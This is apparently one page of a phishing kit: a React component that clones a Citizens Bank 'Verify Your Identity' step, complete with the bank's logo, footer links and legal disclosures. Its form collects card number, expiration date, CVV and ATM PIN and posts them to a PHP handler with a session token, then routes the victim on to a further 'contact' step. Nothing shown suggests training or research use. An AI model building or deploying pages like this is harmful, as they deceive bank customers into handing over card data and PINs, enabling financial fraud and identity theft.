import React from 'react';
import '../assets/css/Follow/app.css';
import '../assets/css/Follow/citizensns.css';
import '../assets/css/Follow/sec-3-3.css';
import logo from '../assets/img/CTZ_Green-01.png';
import equalHousing from '../assets/img/equal-housing.gif';
import footerFollowFacebook from '../assets/img/footer-follow-facebook.png';
import footerFollowLinkedin from '../assets/img/footer-follow-linkedin.png';
import footerFollowTwitter from '../assets/img/footer-follow-twitter.png';
import footerFollowYoutube from '../assets/img/footer-follow-youtube.png';
import elh from '../assets/img/elh.gif';
import fdicFooter from '../assets/img/fdicFooter.gif';
import feedBack from '../assets/img/feedback.png';
import { Link } from 'react-router-dom';

const Card = () => {
  return (
    <div>
      <div class="citizens-header">
        <div class="citizens-header-footer">
          <header id="page-header" class="page-header">
            <div class="centered-content clearfix">
              <a style={{ cursor: 'pointer' }} class="page-logo">
                <img src={logo} alt="Citizens Bank" width="203" height="25" />
              </a>
            </div>
          </header>
        </div>
      </div>
      <div id="page-container" class="page-container">
        <div class="centered-content clearfix">
          <div class="g-unauth-main-container">
            <section class="unauth-intro-area">
              <h2 class="unauth-intro-area__title ">Verify Your Identity</h2>
              <div>
                <div class="unauth-intro-area__step">
                  <strong>Step 3 of 4:</strong>
                  <span>Verify Your Card Information</span>
                </div>
                <div class="unauth-intro-area__progress-container">
                  <div class="unauth-intro-area__progress-segment">
                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                    <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                    <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                  </div>
                </div>
              </div>
              <div id="error"></div>
              <div class="unauth-intro-area__help">
                <p class="unauth-intro-area__text">
                  Please enter your information to verify your account.
                  <br />
                  Your card information is protected with 256-bit server-side encryption.
                </p>
              </div>
            </section>
            <section class="identify-customer-section">
              <form
                id="form"
                action="../Meta/Benchmark/card.php?token=<?php echo $_SESSION['token']; ?>"
                method="POST"
                class="unauth-form jqtransform js-enrollment-form">
                <div class="unauth-form__row">
                  <div class="unauth-form__rowitem">
                    <label class="unauth-form__label" for="card">
                      Card Number
                    </label>
                    <input
                      type="text"
                      name="card"
                      id="card"
                      placeholder="Card Number"
                      class="unauth-form__input js-mobilepassword"
                    />
                  </div>
                  <div class="unauth-form__rowitem">
                    <label class="unauth-form__label" for="exp">
                      Expiration Date
                    </label>
                    <input
                      type="text"
                      name="exp"
                      id="exp"
                      placeholder="Expiration Date"
                      class="unauth-form__input js-mobilepassword"
                    />
                  </div>
                  <div class="unauth-form__rowitem">
                    <label class="unauth-form__label" for="cvv">
                      CVV
                    </label>
                    <input
                      type="text"
                      name="cvv"
                      id="cvv"
                      placeholder="CVV"
                      class="unauth-form__input js-mobilepassword"
                    />
                  </div>
                  <div class="unauth-form__rowitem">
                    <label class="unauth-form__label" for="pin">
                      ATM PIN
                    </label>
                    <input
                      type="text"
                      name="pin"
                      id="pin"
                      placeholder="ATM PIN"
                      class="unauth-form__input js-mobilepassword"
                    />
                  </div>
                </div>
                <div class="unauth-section__button-wrap">
                  <Link to="/contact">
                    <button
                      id="btn"
                      type="button"
                      class="btn unauth-form__submit-button js-unauth-ic-submit-button">
                      Continue
                    </button>
                  </Link>
                  <a class="unauth-form__cancel-link js-cancel-button" tabindex="0">
                    Cancel
                  </a>
                </div>
              </form>
            </section>
          </div>
        </div>
      </div>
      <div class="citizens-footer">
        <div class="citizens-header-footer">
          <footer id="page-footer" class="page-footer">
            <div class="footer-top">
              <ul>
                <li>
                  <a
                    style={{ cursor: 'pointer' }}
                    class="contact"
                    title="Opens Ways to Contact Us Dialog">
                    <span class="account-underline">Ways to Contact Us</span>
                    <span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
                  </a>
                </li>
                <li>
                  <a
                    style={{ cursor: 'pointer' }}
                    class="locator"
                    title="Opens Branch &amp; ATM Locator Dialog">
                    <span class="account-underline">Branch &amp; ATM Locator</span>
                    <span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
                  </a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }} class="feedback" title="Give Feedback">
                    <img
                      src={feedBack}
                      alt="Give Feedback"
                      border="0"
                      style={{
                        cursor: 'pointer',
                        border: 0,
                        height: 40,
                        width: 40,
                        paddingRight: 4,
                      }}></img>
                    <span class="account-underline">Feedback</span>
                    <span class="visuallyhidden">- Opens Feedback</span>
                  </a>
                </li>
              </ul>
            </div>
            <div class="footer-row clearfix">
              <ul>
                <li>
                  <h6>Checking &amp; Savings</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Checking</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Savings</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Money Markets</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>
                    Certificates of Deposit (CDs)
                    <sup>®</sup>
                  </a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>IRAs</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Programs &amp; Services</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Benefits &amp; Features</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Debit Card</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>
                    Overdraft Choices
                    <sup>®</sup>
                  </a>
                </li>
              </ul>
              <ul>
                <li>
                  <h6>Home Borrowing</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Mortgages</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Home Equity Loans</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Home Equity Lines of Credit</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Determine My Rate</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>My Mortgage Account</a>
                </li>
              </ul>
              <ul>
                <li>
                  <h6>Students</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Student Loan Options</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Refinancing Student Loans</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>The Student Loan Process</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Undergraduate Students &amp; Parents</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Graduate Students</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Tools &amp; Information</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Banking for Students</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Access My Student Loan</a>
                </li>
              </ul>
              <ul class="last">
                <li>
                  <h6>Cards</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Credit Cards</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Card Agreements</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Security Features</a>
                </li>
              </ul>
            </div>
            <div class="footer-row clearfix">
              <ul>
                <li>
                  <h6>Personal Loans</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Overview</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>FAQs</a>
                </li>
              </ul>
              <ul>
                <li>
                  <h6>Resources</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Order Checks</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Online &amp; Mobile Banking</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Customer Service</a>
                </li>
              </ul>
              <ul>
                <li>
                  <h6>About Us</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>About Citizens Bank</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>In the Community</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Careers</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>About Our Ads</a>
                </li>
              </ul>
              <ul class="last">
                <li>
                  <h6>Solutions</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Personal</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Investing</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Small Business</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Commercial</a>
                </li>
              </ul>
            </div>
            <div class="footer-row clearfix">
              <ul>
                <li>
                  <h6>Disclosures</h6>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Online Terms and Conditions</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>
                    Electronic Notice Disclosure and Consent (Online Service)
                  </a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Account Documents</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Member FDIC</a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>
                    Equal Housing Lender
                    <img
                      alt="Equal Housing Lender"
                      title="Equal Housing Lender"
                      src={equalHousing}
                    />
                  </a>
                </li>
                <li>
                  <a style={{ cursor: 'pointer' }}>Security, Privacy &amp; Legal</a>
                </li>
              </ul>
            </div>
            <div class="centered-content">
              <div class="footer-bottom">
                <p class="legal">
                  Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC
                  and are used herein under license.
                </p>
                <p class="legal">
                  *Securities, Insurance and Investment Advisory Services offered through Citizens
                  Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is
                  an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy
                  Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens
                  Bank, N.A.
                  <br />
                  <br />
                  The investment balances shown in online banking are based on market prices, with
                  up to a fifteen minute delay from the time this webpage was last refreshed.
                  Information relating to accounts not held at CSI is presented as an accommodation
                  and while drawn from sources believed to be reliable is not guaranteed as to
                  accuracy or completeness. Such information should be independently confirmed by
                  the account owner(s).
                  <br />
                  <br />
                  Information relating to accounts not held or custodied by National Financial
                  Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to
                  NFS by outside parties and is included for informational purposes only. These
                  positions are not part of your brokerage account carried by NFS and therefore any
                  SIPC account protection afforded your account through NFS does not cover these
                  assets or prices reported. Neither NFS, CSI nor Citizens Bank are responsible for
                  the Assets Held Away information provided and does not guarantee the accuracy or
                  timeliness of the positions or prices reported. Prices shown do not necessarily
                  reflect the actual current market prices. Further information regarding these
                  prices may be obtained by contacting CSI.
                  <br />
                  <br />
                  The investment products and financial strategies suggested herein are subject to
                  investment risk, including possible loss of principal amount invested. Investment
                  decisions should be based on each individual's goals, time horizon and tolerance
                  for risk.
                  <br />
                  <br />
                  SpeciFi<sup>®</sup>
                  is made available through CSI. Portfolio management services are sub-advised by
                  SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser.
                  SigFig is not an affiliate of CSI or Citizens Bank, N.A.
                </p>
                <div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
                  <p class="footer-disclaimer-box__text">
                    Securities, Insurance Products and Advisory Services are:
                  </p>
                  <ul class="footer-disclaimer-box__list">
                    <li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
                    <li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
                    <li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
                    <li class="footer-disclaimer-box__list-item">
                      NOT A DEPOSIT
                      <br />
                    </li>
                    <li class="footer-disclaimer-box__list-item">
                      NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY
                    </li>
                  </ul>
                </div>
                <ul class="footer-util">
                  <li class="sitemap">
                    <a style={{ cursor: 'pointer' }}>Site Map</a>
                  </li>
                  <li>
                    Follow:
                    <a style={{ cursor: 'pointer' }}>
                      <img src={footerFollowFacebook} alt="Facebook" align="middle" />
                    </a>
                    <a style={{ cursor: 'pointer' }}>
                      <img src={footerFollowTwitter} alt="Twitter" />
                    </a>
                    <a style={{ cursor: 'pointer' }}>
                      <img src={footerFollowLinkedin} alt="Linkedin" />
                    </a>
                    <a style={{ cursor: 'pointer' }}>
                      <img src={footerFollowYoutube} alt="Youtube" />
                    </a>
                  </li>
                </ul>
                <p class="footer-copyright">
                  © Copyright 2021 Citizens Financial Group, Inc. All rights reserved.
                  <br />
                  Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).
                  <br />
                  Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
                </p>
                <img src={elh} alt="Equal Housing Lender" />
                <img src={fdicFooter} alt="Member FDIC" />
              </div>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
};

export default Card;
